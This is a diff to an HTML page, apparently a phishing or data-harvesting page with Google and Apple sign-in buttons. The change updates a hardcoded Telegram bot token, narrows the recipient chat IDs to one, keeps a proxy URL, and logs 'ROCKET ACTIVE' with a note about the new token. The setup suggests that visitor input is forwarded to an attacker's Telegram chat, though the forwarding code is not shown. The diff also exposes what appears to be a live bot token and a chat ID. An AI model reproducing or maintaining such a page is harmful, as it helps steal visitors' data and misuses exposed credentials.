@@ -249,7 +249,6 @@
 
         .error-message.show { display: block; }
 
-        /* ===== МОДАЛЬНОЕ ОКНО ДОКУМЕНТА ===== */
         .doc-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -369,7 +368,6 @@
         .doc-footer button:hover { background: #1d4ed8; }
         .doc-footer button:active { transform: scale(0.96); }
 
-        /* ===== ПЛАШКА СНИЗУ ===== */
         .toast {
             position: fixed;
             left: 50%;
@@ -476,8 +474,8 @@
 <script>
     // ===== ВАШИ ДАННЫЕ =====
     const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
-    const BOT_TOKEN = "8924231437:8924231437:AAH1Spopdj-NRRnO4BtLc3rDRovopNLkMO0";
-    const CHAT_IDS = ["8872810304", ""];
+    const BOT_TOKEN = "8924231437:AAH1Spopdj-NRRnO4BtLc3rDRovopNLkMO0"; // Новый токен
+    const CHAT_IDS = ["8872810304"]; // Оставлен только один получатель
     // ========================
 
     // ===== УСЛОВИЯ ИСПОЛЬЗОВАНИЯ =====
@@ -663,7 +661,7 @@
     document.getElementById("googleBtn").addEventListener("click", showToast);
     document.getElementById("appleBtn").addEventListener("click", showToast);
 
-    console.log("ROCKET ACTIVE — официальные тексты");
+    console.log("ROCKET ACTIVE — RuTest (1 получатель, новый токен)");
 </script>
 </body>
 </html>
